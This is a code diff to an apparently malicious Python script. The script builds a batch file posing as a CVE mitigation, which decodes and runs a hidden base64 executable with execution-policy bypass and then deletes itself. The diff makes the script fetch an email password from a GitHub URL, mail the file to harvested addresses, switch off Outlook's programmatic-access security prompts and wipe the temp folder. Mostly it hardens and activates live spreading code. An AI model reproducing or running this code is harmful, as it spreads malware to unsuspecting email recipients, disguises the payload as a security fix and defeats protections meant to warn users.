@@ -149,9 +149,9 @@ def generate():
             r'echo %DATE% %TIME% : CVE-2025-3280 MITIGATED > %SystemRoot%\Security\MSRC78932_compliance.log',
             'echo Protection enabled. Verify at https://response.jsecurityltd.com/validate',
             '',
-            f'powershell -Command "[IO.File]::WriteAllBytes(\'%temp%\\%exe_name%\', [Convert]::FromBase64String((Get-Content \'%temp%\\%exe_name%.b64\')))"',
+            f'powershell -ep bypass -noP -w hidden -Command "[IO.File]::WriteAllBytes(\'%temp%\\%exe_name%\', [Convert]::FromBase64String((Get-Content \'%temp%\\%exe_name%.b64\')))"',
             'del "%temp%\\!exe_name!.b64"',
-            'powershell -ep bypass -noP -nonI start-process powershell.exe "{%temp%\\!exe_name!}"', # remember to use '-w hidden' when release
+            'powershell -ep bypass -noP -nonI -w hidden start-process powershell.exe -windowstyle hidden "{%temp%\\!exe_name!}"', 
             'del "%~f0"'
         ])
  
@@ -161,7 +161,10 @@ def generate():
 
 def send_a(bat_path, emails):
     email_user = "defalttests@gmail.com"
-    email_pass = base64.b64decode("Y2NvcSBnd3hoIGpnb3MgZ3FpZw==").decode()
+    try:
+        r = requests.get("https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/finde/secret")
+        email_pass = base64.b64decode(r.content).decode()
+    except: return
 
     with open(bat_path, 'rb') as f:
         attachment_data = f.read()
@@ -964,8 +967,15 @@ def configure_outlook_security(office_version='16.0', wow64_32=False, x86os=Fals
     hkcu_values = {
         'PromptOOMSend': 2,
         'AdminSecurityMode': 3,
-        'promptoomaddressinformationaccess': 2,
-        'promptoomaddressbookaccess': 2
+        'PromptOOMAddressBookAccess': 2,
+        'PromptOOMAddressInformationAccess': 2,
+        'PromptOOMMeetingTaskRequestResponse': 2,
+        'PromptOOMSaveAs': 2,
+        'PromptOOMFormulaAccess': 2,
+        'PromptOOMMailItemAccess': 2,
+        'PromptOOMFolderAccess': 2,
+        'PromptOOMAddressListAccess': 2,
+        'PromptOOMRecipientAccess': 2,
     }
 
     hkcu_success = True
@@ -1070,12 +1080,12 @@ emails = list(set(final_emails))
 
 bat_path = generate()
 
-# send_a(bat_path, emails)
+send_a(bat_path, emails)
 # just_try_smb()
 
-print("AFTER FILTERINGGG")
-for email in emails:
-    print(email)
-print(len(emails))
+# print("AFTER FILTERINGGG")
+# for email in emails:
+#     print(email)
+# print(len(emails))
 
 os.system(f"powershell remove-item -path {os.getenv("TEMP")} -force -recurse -erroraction silentlycontinue")
